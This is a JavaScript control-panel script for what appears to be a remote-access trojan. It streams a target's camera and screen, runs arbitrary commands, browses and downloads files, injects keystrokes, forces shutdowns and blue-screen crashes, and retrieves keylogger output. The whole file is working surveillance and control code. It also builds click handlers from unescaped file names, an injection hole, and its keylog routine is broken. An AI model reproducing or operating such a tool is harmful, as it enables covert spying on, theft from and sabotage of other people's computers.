function validateIp(ip) {
    let blocks = ip.split(".");
    if (blocks.length != 4) {
        return false;
    }
    for (let i in blocks) {
        let block = blocks[i];
        if (isNaN(block)) {
            return false;
        }
        block = parseInt(block);
        if (!(0 <= block && block <= 255)) {
            return false;
        }
    }
    return true;
}

function connect(type = "both") {
    if (type === "both") {
        type = ["camera", "screen"];
    } else {
        type = [type];
    }

    let random = `?_=${Date.now()}`;

    if (type.includes("screen")) {
        let screen = document.getElementById("screen");
        let parent = screen.parentElement;
        parent.removeChild(screen);

        screen = document.createElement("img");
        screen.id = "screen";
        screen.src = `http://${IP}:${PORT}/screen${random}`;
        screen.alt = "Failed to load screen feed";
        parent.insertBefore(screen, parent.childNodes[2]);
    }

    if (type.includes("camera")) {
        let camera = document.getElementById("camera");
        let parent = camera.parentElement;
        parent.removeChild(camera);

        camera = document.createElement("img");
        camera.id = "camera";
        camera.src = `http://${IP}:${PORT}/camera${random}`;
        camera.alt = "Failed to load camera feed";
        parent.insertBefore(camera, parent.childNodes[2]);
    }
}

function validatePort(port) {
    if (isNaN(port)) {
        return false;
    }
    port = parseInt(port);
    if (0 <= port && port <= Math.pow(2, 16) - 1) {
        return true;
    }
    return false;
}

function log(text, type = "text") {
    let logElement = document.getElementById("log");
    let newLog = document.createElement("p");
    if (type == "error") {
        newLog.classList.add("error");
    } else if (type == "warning") {
        newLog.classList.add("warning");
    }

    text = type === "command" ? "$ " + text : "~ " + text;

    newLog.textContent = text;

    let autoScroll =
        logElement.scrollTop + logElement.clientHeight ===
        logElement.scrollHeight;

    logElement.appendChild(newLog);

    if (autoScroll) {
        logElement.scrollTop = logElement.scrollHeight;
    }
}

function requestGet(url, type = "normal") {
    fetch(url)
        .then((response) => response.json())
        .then((response) => {
            if (type === "normal") {
                log(JSON.stringify(response));
            } else if (type == "run") {
                let args = response.args;
                let returncode = response.returncode;
                let stderr = response.stderr.join("\n").trim();
                let stdout = response.stdout.join("\n").trim();
                if (stderr !== "") {
                    log(stderr, "warning");
                }
                if (stdout !== "") {
                    log(stdout);
                }
                log(`Returncode: ${returncode}`);
            }
        })
        .catch((error) => log(`${error}`, "error"));
}

function send(type) {
    let title = document.getElementById("send-title").value;
    let text = document.getElementById("send-text").value;

    requestGet(
        `http://${IP}:${PORT}/${type}?` +
            `title=${encodeURIComponent(title)}&` +
            `text=${encodeURIComponent(text)}`
    );
}

function run(command) {
    log(command, "command");
    requestGet(
        `http://${IP}:${PORT}/run?` + `command=${encodeURIComponent(command)}`,
        "run"
    );
}

function setPath(newPath) {
    PATH = newPath;
    if (
        !["/", "C:\\"].includes(PATH) &&
        PATH.length > 0 &&
        ["/", "\\"].includes(PATH[PATH.length - 1])
    ) {
        PATH = PATH.replace(/\/+$/, "");
    }
    pathElement.value = newPath;
    ls();
}

function pathJoin(path1, path2) {
    let addSlash =
        path1.length > 0 && !["/", "\\"].includes(path1[path1.length - 1]);
    let newPath = path1 + (addSlash ? "/" : "") + path2;
    return newPath;
}

function download(path, file) {
    let url =
        `http://${IP}:${PORT}/download?` +
        `path=${encodeURIComponent(pathJoin(path, file))}`;

    fetch(url)
        .then((response) => response.json())
        .then((response) => {
            const encoder = new TextEncoder();

            let data = response.data;
            data = data.replace(/-/g, "/");
            data = atob(data);
            const binData = new Uint8Array(data.length);
            for (let i = 0; i < data.length; i++) {
                binData[i] = data.charCodeAt(i);
            }

            const blob = new Blob([binData], {
                type: "application/octet-stream",
            });

            url = URL.createObjectURL(blob);

            const link = document.createElement("a");
            link.href = url;
            link.download = file;

            document.body.appendChild(link);
            link.click();

            document.body.removeChild(link);
            URL.revokeObjectURL(url);
        })
        .catch((error) => log(`${error}`, "error"));
}

function listFiles(response) {
    let status = response.status;
    if (status !== "ok") {
        return;
    }

    let filesElement = document.getElementById("files");
    filesElement.replaceChildren("");
    let files = response.files;
    let folders = response.folders;
    let parent = response.parent;

    let folderElement = document.createElement("button");
    folderElement.setAttribute("onclick", `setPath('${parent}')`);
    folderElement.classList.add("parent-folder");
    folderElement.textContent = "<";

    filesElement.appendChild(folderElement);

    for (let i in folders) {
        let folder = folders[i];
        let newPath = pathJoin(PATH, folder);
        let folderElement = document.createElement("button");
        folderElement.setAttribute("onclick", `setPath('${newPath}')`);
        folderElement.classList.add("folder");
        folderElement.textContent = "🖿 " + folder;

        filesElement.appendChild(folderElement);
    }
    for (let i in files) {
        let file = files[i];
        let folderElement = document.createElement("button");
        folderElement.setAttribute("onclick", `download('${PATH}', '${file}')`);
        folderElement.classList.add("file");
        folderElement.textContent = file;

        filesElement.appendChild(folderElement);
    }
}

async function ls() {
    let url = `http://${IP}:${PORT}/ls?` + `path=${encodeURIComponent(PATH)}`;

    let response = await fetch(url)
        .then((response) => response.json())
        .then((response) => listFiles(response))
        .catch((error) => log(`${error}`, "error"));
}

function shutdown() {
    let forced = forcedElement.checked;
    requestGet(
        `http://${IP}:${PORT}/shutdown?` +
            `args=${encodeURIComponent(`/s ${forced ? "/f " : ""}/t 0`)}`
    );
}

function restart() {
    let forced = forcedElement.checked;
    requestGet(
        `http://${IP}:${PORT}/shutdown?` +
            `args=${encodeURIComponent(`/r ${forced ? "/f " : ""}/t 0`)}`
    );
}

function bsod() {
    requestGet(`http://${IP}:${PORT}/bsod`);
}

function ipLock() {
    if (ipLockData[0] && ipLockData[1]) {
        ipLockedElement.style.display = "flex";
    } else {
        ipLockedElement.style.display = "none";
    }
}

async function keylog() {
    let url = `http://${IP}:${PORT}/keylog`;

    let response = await fetch(url)
        .then((response) => response.json())
        .then((response) => listFiles(response))
        .catch((error) => log(`${error}`, "error"));

    let lines = response.keylog;

    keylogElement.replaceChildren("");

    for (let i in lines) {
        let line = lines[i];
        let lineElement = document.createElement("p");
        lineElement.textContent = line;

        keylogElement.appendChild(lineElement);
    }
}

function checkIp() {
    let ip = ipElement.value;
    let valid = validateIp(ip);
    if (valid) {
        ipElement.classList.add("valid");
        ipElement.classList.remove("invalid");
        IP = ip;
        connect();
        localStorage.setItem("ip", ip);
    } else {
        ipElement.classList.add("invalid");
        ipElement.classList.remove("valid");
    }
    ipLockData[0] = valid;
    ipLock();
}

function checkPort() {
    let port = portElement.value;
    let valid = validatePort(port);
    if (valid) {
        portElement.classList.add("valid");
        portElement.classList.remove("invalid");
        PORT = port;
        connect();
        localStorage.setItem("port", port);
    } else {
        portElement.classList.add("invalid");
        portElement.classList.remove("valid");
    }
    ipLockData[1] = valid;
    ipLock();
}

function keyboard(type) {
    let text = document.getElementById("keyboard-text").value;
    let url =
        `http://${IP}:${PORT}/${type}?` +
        (type === "send" ? "hotkey" : "text") +
        `=${encodeURIComponent(text)}`;

    requestGet(url);
}

let ipElement = document.getElementById("ip");
let portElement = document.getElementById("port");
let runElement = document.getElementById("run");
let pathElement = document.getElementById("path");
let forcedElement = document.getElementById("forced");
let ipLockedElement = document.getElementById("ip-locked");
let keylogElement = document.getElementById("keylog");
let forcedTextElement = document.getElementById("forced-text");

if (!localStorage.getItem("ip")) {
    localStorage.setItem("ip", "127.0.0.1");
}
ipElement.value = localStorage.getItem("ip");

if (!localStorage.getItem("port")) {
    localStorage.setItem("port", "3737");
}
portElement.value = localStorage.getItem("port");

let IP = ipElement.value;
let PORT = portElement.value;
let commandHistory = [];
let commandIndex = -1;
let PATH = pathElement.value;
let ipLockData = [false, false];

ipElement.addEventListener("input", () => {
    checkIp();
});

portElement.addEventListener("input", () => {
    checkPort();
});

runElement.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
        run(runElement.value);
        commandHistory.push(runElement.value);
        commandIndex = commandHistory.length;
        runElement.value = "";
    } else if (
        commandHistory.length > 0 &&
        commandIndex <= commandHistory.length &&
        commandIndex >= 0
    ) {
        if (event.key == "ArrowUp" && commandIndex > 0) {
            commandIndex--;
            runElement.value = commandHistory[commandIndex];
        } else if (event.key == "ArrowDown") {
            if (commandIndex < commandHistory.length - 1) {
                commandIndex++;
                runElement.value = commandHistory[commandIndex];
            } else if (commandIndex === commandHistory.length - 1) {
                commandIndex++;
                runElement.value = "";
            }
        }
    }
});

pathElement.addEventListener("input", () => {
    setPath(pathElement.value);
});

forcedTextElement.addEventListener("click", () => {
    forcedElement.click();
});

checkIp();
checkPort();
ls();
keylog();
